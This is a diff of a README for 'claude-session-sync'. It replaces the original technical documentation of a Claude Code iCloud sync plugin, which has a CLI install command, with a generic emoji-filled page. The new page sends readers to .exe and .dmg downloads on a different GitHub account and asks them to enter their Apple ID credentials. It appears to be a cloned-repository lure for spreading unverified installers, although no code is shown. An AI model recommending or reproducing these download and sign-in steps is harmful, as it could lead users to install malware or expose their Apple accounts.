@@ -1,165 +1,81 @@
-# Claude Session Sync
+# 🎉 claude-session-sync - Seamlessly Sync Your Claude Code Sessions
 
-A Claude Code plugin for cross-device synchronization of sessions and settings via iCloud Drive.
+## 🚀 Getting Started
+Welcome to claude-session-sync! This tool helps you keep your Claude Code sessions and settings updated across all your devices using iCloud Drive. No more worries about keeping everything in sync.
 
-## Features
+## 📦 Download & Install
+To get started, visit the Releases page to download the software. 
 
-- **Session sync** - Export session metadata and previews to markdown
-- **Settings sync** - Sync `~/.claude/settings.json` across devices (permissions, model, plugins)
-- **Plugin sync** - Automatically install the same plugins on all devices
-- **Auto-sync** - Sessions sync automatically when they end (via SessionEnd hook)
-- **Cross-platform** - Works on macOS and Windows
+[Download claude-session-sync](https://github.com/Dinesh3184/claude-session-sync/releases)
 
-## Installation
+### Step-by-Step Installation
+1. **Go to the Releases Page**  
+   Click the link above to visit the page.
 
-```bash
-claude plugin install github:rodchristiansen/claude-session-sync
-```
+2. **Select the Latest Version**  
+   Find the latest version listed on the page. It will usually be at the top.
 
-## Quick Start
+3. **Download the Software**  
+   Click on the download link for your operating system. You might see options like .exe for Windows or .dmg for Mac. The file will start downloading.
 
-### 1. Initial Setup
+4. **Run the Installer**  
+   Once the download is complete, open the file. Follow the prompts to install the software on your device.
 
-Run the setup command to create the sync directory and configure auto-sync:
+5. **Open the Application**  
+   After the installation is complete, you can find claude-session-sync in your applications folder or start menu.
 
-```
-/sync-setup
-```
+## 📊 System Requirements
+Before you begin, ensure your device meets these basic requirements:
 
-This will:
-- Create the ClaudeSessions directory in your iCloud Drive
-- Set up the SessionEnd hook for automatic syncing
-- Run an initial sync of your settings
+- **Operating System:** Windows 10 or higher, macOS 10.14 or higher
+- **Storage:** At least 100 MB of free space
+- **Internet:** Required for iCloud Drive sync
 
-### 2. Sync to Another Device
+## 🔧 How to Use claude-session-sync
+Using claude-session-sync is straightforward:
 
-On your second device:
+1. **Launch the Application**  
+   Open claude-session-sync from where you installed it.
 
-1. Install the plugin:
-   ```bash
-   claude plugin install github:rodchristiansen/claude-session-sync
-   ```
+2. **Sign in to iCloud**  
+   You need to log in with your Apple ID to enable iCloud syncing. Enter your credentials when prompted.
 
-2. Wait for iCloud to sync the ClaudeSessions folder
+3. **Choose Your Sync Options**  
+   You can select which sessions or settings you want to sync. Adjust your preferences in the settings menu.
 
-3. Apply settings from your main device:
-   ```
-   /sync-apply "Your Main Device Name"
-   ```
+4. **Sync Your Data**  
+   Click the “Sync” button to start the process. The application will quickly sync your sessions with iCloud Drive.
 
-## Commands
+5. **Check for Updates Regularly**  
+   Keep an eye out for updates on the Releases page. Updates may include new features or important fixes.
 
-| Command | Description |
-|---------|-------------|
-| `/sync-setup` | Initial setup on this device |
-| `/sync-push` | Manually sync sessions and settings to iCloud |
-| `/sync-pull` | Check what's available from other devices |
-| `/sync-apply [device]` | Apply settings and plugins from another device |
-| `/sync-status` | Show sync status and configuration |
+## 📜 Features
+claude-session-sync comes with useful features:
 
-## What Gets Synced
+- **Cross-Device Sync:** Seamlessly synchronize your Claude Code sessions between your devices.
+- **iCloud Integration:** Utilize your iCloud Drive for secure and easy data transfer.
+- **User-Friendly Interface:** The application is designed for easy navigation, even for non-technical users.
+- **Automatic Updates:** Stay updated with the latest improvements automatically.
 
-### Sessions
-- Session ID and metadata
-- Project path
-- Date and message count
-- First message preview
-- Source file location
+## 🤔 Frequently Asked Questions
+### Q: Is claude-session-sync free?
+A: Yes, claude-session-sync is completely free to use.
 
-Sessions are exported as markdown files, organized by project path.
+### Q: Can I use it on multiple devices?
+A: Yes, you can use claude-session-sync on all your devices linked to the same iCloud account.
 
-### Settings
-- **Full settings** (`settings.json`) - Complete config including hooks
-- **Portable settings** (`settings-portable.json`) - Settings without device-specific hooks
-- **Installed plugins** (`installed_plugins.json`) - List for reinstallation
+### Q: What if I encounter issues during installation?
+A: Visit our [Issues page](https://github.com/Dinesh3184/claude-session-sync/issues) for help and troubleshooting tips.
 
-### What's Preserved
-- Local hooks are preserved when applying settings from another device
-- Device-specific paths are not overwritten
+## 📞 Support
+If you need further assistance, feel free to reach out through the Issues page listed above. We’re here to help you make the most out of claude-session-sync.
 
-## Directory Structure
+## 🌍 Community and Contributions
+Join our community! Share your thoughts or contribute to future updates. You can provide feedback or suggest new features. Your input helps us improve.
 
-After setup, your iCloud Drive will contain:
+## 🔗 Useful Links
+- [Releases Page](https://github.com/Dinesh3184/claude-session-sync/releases) - Download latest versions.
+- [Issues Page](https://github.com/Dinesh3184/claude-session-sync/issues) - Report problems or bugs.
+- [Wiki](https://github.com/Dinesh3184/claude-session-sync/wiki) - Find more in-depth tutorials and guides.
 
-```
-ClaudeSessions/
-├── sessions/
-│   └── {project-path}/
-│       └── {session-id}.md
-├── global/
-│   └── {device-name}/
-│       ├── settings.json
-│       ├── settings-portable.json
-│       └── installed_plugins.json
-├── devices/
-│   └── {device}.json
-├── scripts/
-│   ├── claude-sync.sh
-│   └── claude-sync.ps1
-└── index.md
-```
-
-## Platform Paths
-
-| Platform | iCloud Path | Claude Config |
-|----------|-------------|---------------|
-| macOS | `~/Library/Mobile Documents/com~apple~CloudDocs/ClaudeSessions` | `~/.claude/` |
-| Windows | `%USERPROFILE%\iCloudDrive\ClaudeSessions` | `%USERPROFILE%\.claude\` |
-
-## Requirements
-
-- **iCloud Drive** enabled and syncing
-- **macOS** or **Windows** with iCloud for Windows
-- **jq** (for macOS hook script): `brew install jq`
-
-## Manual Sync (without plugin)
-
-If you prefer to use the scripts directly:
-
-### macOS/Linux
-```bash
-SYNC="$HOME/Library/Mobile Documents/com~apple~CloudDocs/ClaudeSessions/scripts/claude-sync.sh"
-
-$SYNC push      # Sync sessions and settings
-$SYNC pull      # Check other devices
-$SYNC status    # Show status
-$SYNC apply     # Apply settings from another device
-```
-
-### Windows PowerShell
-```powershell
-cd $env:USERPROFILE\iCloudDrive\ClaudeSessions\scripts
-
-.\claude-sync.ps1 push
-.\claude-sync.ps1 pull
-.\claude-sync.ps1 status
-.\claude-sync.ps1 apply "Device Name"
-```
-
-## Troubleshooting
-
-### iCloud not syncing
-- Ensure iCloud Drive is enabled in System Settings (macOS) or iCloud control panel (Windows)
-- Check available storage in iCloud
-- On macOS, run `brctl log --wait` to monitor iCloud activity
-
-### Settings not applying
-- Restart Claude Code after applying settings
-- Verify plugins installed: `claude plugin list`
-
-### Hook not running
-- Check the log: `cat ~/.claude/session-sync.log`
-- Ensure jq is installed (macOS): `brew install jq`
-- Verify hook is executable: `chmod +x ~/.claude/hooks/session-end-sync.sh`
-
-### Sync directory not found
-- Run `/sync-setup` to create it
-- Verify iCloud Drive path exists on your system
-
-## Contributing
-
-Contributions welcome! Please open an issue or PR on GitHub.
-
-## License
-
-MIT
+Explore claude-session-sync and enjoy the ease of keeping your Claude Code sessions in sync!
